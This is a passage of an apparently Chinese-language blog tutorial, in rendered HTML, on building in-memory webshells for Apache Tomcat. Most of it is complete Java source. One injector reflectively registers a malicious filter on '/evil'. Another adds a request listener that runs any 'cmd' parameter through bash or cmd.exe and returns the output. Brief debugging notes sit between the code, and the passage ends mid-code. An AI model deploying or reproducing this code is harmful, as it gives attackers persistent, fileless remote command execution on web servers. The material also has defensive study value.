class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">            <span class="keyword">if</span> (requestFacade != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">filterShell</span>();  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterDef  </span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">                filterDef.setFilter(filter);  </span><br><span class="line">                filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">                stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterMap  </span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">                filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">                filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">                stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">                filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">                filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e.getMessage());  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;evil!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">            response.getWriter().println(output);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> <span class="string">&quot;Error executing command: \n&quot;</span> + e.getMessage();  </span><br><span class="line">            response.getWriter().println(errorMessage);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250730121828.png" alt="image.png"></p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="源码调试-1"><a href="#源码调试-1" class="headerlink" title="源码调试"></a>源码调试</h4><p>Litener又在Filter之前<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724011341.png" alt="image.png"><br>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p><ul><li>&#x3D;&#x3D;<code>ServletContextListener</code>&#x3D;&#x3D;，用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>ServletRequestListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>HttpSessionListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>HttpSessionAttributeListener</code>&#x3D;&#x3D;，监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li></ul><p>很明显，<code>ServletRequestListener</code>是最适合做内存马的，因为它只要访问服务就能触发操作。<br>这个接口的位置在<code>javax.servlet.ServletRequestListener</code></p><p>实现一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebListener(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] initial TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动并发起一个请求<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013002.png" alt="image.png"></p><p>在requestDestroyed和requestInitialized方法打断点<br>可以看见在&#x3D;&#x3D;进入context的pipLine之前&#x3D;&#x3D;, 是<code>context.fireRequestInitEvent(request.getRequest()))</code>来触发事件监听器的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013313.png" alt="image.png"></p><p>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013742.png" alt="image.png"><br><code>getApplicationEventListeners</code>获取的Listeners</p><p>对应方法定义如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724014542.png" alt="image.png"></p><p>可以看见也存在添加Listener的方法</p><h4 id="Listener内存马构造"><a href="#Listener内存马构造" class="headerlink" title="Listener内存马构造"></a>Listener内存马构造</h4><p>有了之前的经验就比较简单了<br>用servlet写个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test2&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testWithListenerServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilListener</span>();  </span><br><span class="line">            stdctx.addApplicationEventListener(listener);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(cmd);  </span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Class&lt;?&gt; requestClazz = requestFacade.getClass();  </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestfield</span> <span class="operator">=</span> requestClazz.getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">                    requestfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestfield.get(requestFacade);  </span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();  </span><br><span class="line">                    response.getWriter().println(output);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span 